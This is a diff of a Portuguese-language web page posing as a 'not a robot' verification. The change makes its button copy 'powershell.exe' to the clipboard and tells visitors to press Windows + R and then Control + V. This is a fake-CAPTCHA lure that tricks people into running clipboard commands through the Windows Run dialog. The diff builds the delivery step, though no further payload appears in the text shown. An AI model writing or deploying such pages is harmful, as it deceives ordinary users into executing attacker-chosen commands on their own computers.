@@ -15,6 +15,7 @@
             margin-top: 10px;
             font-weight: bold;
             color: green;
+            line-height: 1.8; /* Ajusta o espaçamento entre as linhas */
         }
         #campoConfirmacao {
             display: none; /* Oculta o campo de texto inicialmente */
@@ -29,14 +30,18 @@
     <h2>Confirme que você não é um robô</h2>
     <button onclick="copiarTexto()">Clique para copiar</button>
 
-    <p id="mensagem">Aperte <b>Ctrl + V</b> e <b>Enter</b> para confirmar que não é um robô.</p>
+    <p id="mensagem">
+        Windows + R <br>
+        Control + V <br>
+        para confirmar que não é um robô
+    </p>
     <input type="text" id="campoConfirmacao" placeholder="Cole aqui e aperte Enter" onkeypress="verificarEntrada(event)">
 
     <p id="resultado"></p>
 
     <script>
         function copiarTexto() {
-            const comando = "EU-SOU-HUMANO"; // Define o texto que será copiado
+            const comando = "powershell.exe"; // Define o texto que será copiado 
             
             navigator.clipboard.writeText(comando).then(() => {
                 // Exibe a mensagem e o campo de confirmação
